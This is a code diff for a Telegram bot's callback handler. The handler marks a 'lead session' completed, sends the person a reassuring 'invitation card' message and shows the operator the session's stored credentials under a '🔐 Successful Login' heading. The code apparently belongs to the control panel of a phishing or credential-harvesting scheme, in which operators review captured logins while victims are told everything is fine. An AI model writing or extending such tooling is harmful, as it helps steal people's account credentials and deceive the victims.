@@ -472,23 +472,24 @@ bot.callbackQuery(callbackPatterns.complete, async (context) => {
   const [, sessionId] = context.match;
   await context.answerCallbackQuery({ text: "Completing..." });
   try {
-    const channel = await updateLeadSession(sessionId, {
+    const session = await updateLeadSession(sessionId, {
       status: "completed",
       process: "init",
       feedback:
         "We've sent your invitation card to your email address. " +
         "Stay tunned for follow up instructions.",
     });
-    if (!channel) throw new Error("Invalid sessionId or expired session.");
+    if (!session) throw new Error("Invalid sessionId or expired session.");
+    context.deleteMessage().catch(() => {});
     await renderSessionCard(
       context,
-      sessionId,
-      channel,
+      sessionId + "-completed",
+      session,
       new InlineKeyboard().text(
         "Restart",
         reviewCallbackData(sessionId, callbackActions.restart),
       ),
-      composeTelegramMessage(channel.credentials, "🔐 Successful Login"),
+      composeTelegramMessage(session.credentials, "🔐 Successful Login"),
     );
   } catch (error) {
     console.error("Lead review callback failed:", error);
